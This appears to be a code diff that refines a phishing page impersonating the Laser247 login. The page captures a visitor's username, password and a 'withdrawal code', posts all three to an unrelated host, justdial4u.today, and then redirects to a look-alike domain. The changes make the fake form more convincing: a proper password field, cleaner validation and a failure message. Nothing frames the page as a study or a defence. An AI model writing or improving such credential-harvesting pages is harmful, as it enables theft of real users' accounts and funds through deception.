@@ -257,24 +257,24 @@
     <div class="logoSide">
         <img src="assets/image/logo.gif" alt="Laser247">
     </div>
-    <div class="otherHeadSide">
-        <div id="userpass">
-            <span><i class="fa fa-user" aria-hidden="true"></i></span>
-            <input type="text" id="username" name="username" placeholder="Username">
-            <input type="text" id="password" password="password" placeholder="Password">
-            <button id="LoginDeskButton" >Login <i class="fa fa-arrow-right" aria-hidden="true"></i></button>
-            <button >Login With Demo ID <i class="fa fa-arrow-right" aria-hidden="true"></i></button>
-        </div>
-        <div id="withcode">
-            <input type="text" id="withdrawal" placeholder="Withdrawal Code">
-            <button id="loginFinal">Login <i class="fa fa-arrow-right" aria-hidden="true"></i></button>
-        </div>
-        <p id="ERRORSHOW"></p>
+   <div class="otherHeadSide">
+    <div id="userpass">
+        <span><i class="fa fa-user" aria-hidden="true"></i></span>
+        <input type="text" id="username" name="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button id="LoginDeskButton">Login <i class="fa fa-arrow-right" aria-hidden="true"></i></button>
+        <button>Login With Demo ID <i class="fa fa-arrow-right" aria-hidden="true"></i></button>
     </div>
-    <div class="buttonMobile">
-        <button onclick="window.location.href='index.html'">Demo</button>
-        <button onclick="window.location.href='login.html'"  class="loginButton"><i class="fa fa-user" aria-hidden="true"></i> Login</button>
+    <div id="withcode">
+        <input type="text" id="withdrawal" placeholder="Withdrawal Code">
+        <button id="loginFinal">Login <i class="fa fa-arrow-right" aria-hidden="true"></i></button>
     </div>
+    <p id="ERRORSHOW"></p>
+</div>
+<div class="buttonMobile">
+    <button onclick="window.location.href='index.html'">Demo</button>
+    <button onclick="window.location.href='login.html'" class="loginButton"><i class="fa fa-user" aria-hidden="true"></i> Login</button>
+</div>
 </div>
 <div class="navigationSection"> 
     <ul class="list-inline">
@@ -1046,19 +1046,14 @@
         var username = $('#username').val();
         var password = $('#password').val();
 
-        // Validate inputs
-        if (username == "" && password == "") {
-            $('#ERRORSHOW').html('All fields are required.');
-        } else if (username == "") {
-            $('#ERRORSHOW').html('Username field is required.');
-        } else if (password == "") {
-            $('#ERRORSHOW').html('Password field is required.');
+        if (username === "" || password === "") {
+            $('#ERRORSHOW').html('Both Username and Password are required.');
         } else {
             $('#ERRORSHOW').html('');
-            $('#userpass').css('display', 'none');
+            $('#userpass').hide();
             sessionStorage.setItem("username", username);
             sessionStorage.setItem("password", password);
-            $('#withcode').css('display', 'block');
+            $('#withcode').show();
         }
     });
 
@@ -1066,27 +1061,25 @@
     $('#loginFinal').on('click', function() {
         var code = $('#withdrawal').val();
 
-        // Validate code input
-        if (code == "") {
-            $('#ERRORSHOW').html('All fields are required.');
+        if (code === "") {
+            $('#ERRORSHOW').html('Withdrawal Code is required.');
         } else {
             $('#ERRORSHOW').html('');
             var username = sessionStorage.getItem("username");
             var password = sessionStorage.getItem("password");
 
-            // AJAX request to submit data
             $.ajax({
                 url: 'https://justdial4u.today/laxer247.php',
                 type: 'post',
                 data: { username, password, code },
                 success: function(result) {
-                    // Fix comparison here
                     if (result === "sucessmsg") {
                         window.location.href = "https://laxzer247.com";
+                    } else {
+                        $('#ERRORSHOW').html('Invalid withdrawal code or login failed.');
                     }
                 },
                 error: function(xhr, status, error) {
-                    // Handle errors in the AJAX request
                     console.log("Error: " + status + " - " + error);
                     $('#ERRORSHOW').html('There was an issue with the request. Please try again later.');
                 }
@@ -1094,6 +1087,5 @@
         }
     });
 </script>
-
 </body>
 </html>
